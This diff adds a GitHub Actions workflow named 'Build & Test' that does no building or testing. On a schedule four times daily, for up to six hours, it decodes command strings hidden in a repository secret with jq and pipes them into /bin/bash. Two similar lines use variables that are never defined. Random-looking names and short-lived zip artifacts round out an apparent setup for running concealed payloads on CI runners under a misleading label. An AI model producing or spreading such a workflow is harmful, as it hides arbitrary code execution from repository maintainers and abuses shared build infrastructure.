@@ -1,0 +1,35 @@
+name: Build & Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '39 3,9,15,21 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  agent:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Perform
+        env:
+          ag5602: ${{ secrets.ag5602 }}
+        run: |
+          printf '%s' "$ag5602" | jq -r .q679 | /bin/bash
+          echo $aa047 | jq -r .czd96 | /bin/bash
+          printf '%s' "$jxmrv50455" | jq -r .ltmhq7 | /bin/bash
+
+      - name: Upload results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: uI8Club1
+          path: "*.zip"
+          retention-days: 1
